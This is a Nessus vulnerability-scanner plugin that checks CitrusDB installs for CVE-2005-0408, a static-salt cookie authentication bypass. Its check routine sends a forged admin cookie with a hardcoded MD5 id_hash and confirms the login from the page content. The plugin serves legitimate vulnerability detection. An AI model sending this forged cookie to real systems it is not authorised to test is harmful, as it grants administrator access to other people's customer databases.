#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(16477);
 script_version("$Revision: 1.16 $");

 script_cve_id("CVE-2005-0408");
 script_bugtraq_id(12560, 12557);
 script_osvdb_id(13782);

 script_name(english:"CitrusDB Static id_hash Admin Authentication Bypass");

 script_set_attribute(attribute:"synopsis", value:
"The remote host contains a PHP script that is affected by an
authentication bypass vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running CitrusDB, an open source customer database
application written in PHP. 

The version of CitrusDB installed on the remote host uses as an
authentication cookie the MD5 checksum of a username followed by the
constant 'boogaadeeboo'.  Knowing a valid username on the remote
install, an attacker may be able to leverage this issue to bypass
authentication and gain access as that user.  And in fact, Nessus has
managed to exploit this issue to log in as the user 'admin', which is
the default administrator name in CitrusDB." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2005/Feb/350" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/02/16");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/02/13");
 script_cvs_date("$Date: 2016/10/07 13:30:47 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:citrusdb:citrusdb");
script_end_attributes();

 
 summary["english"] = "Tries to authenticate to CitrusDB as admin";

 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

global_var port;

port = get_http_port(default:80, php: 1);

init_cookiejar();

function check(url)
{
 local_var r;

 set_http_cookie(name: 'user_name', value: 'admin');
 set_http_cookie(name: 'id_hash', value: '4b3b2c8666298ae9771e9b3d38c3f26e');
 r = http_send_recv3(method: 'GET', port: port, item: url+"/main.php", version: 11, exit_on_fail: 1);
 if ( "<!-- Copyright (C) 2002  Paul Yasi <paul@citrusdb.org>, read the README file for more information -->" >< r[2]) 
 {
        security_hole(port);
        exit(0);
 }
}

check(url:"/citrusdb");
foreach dir ( cgi_dirs() )
{
  check(url:dir);
}
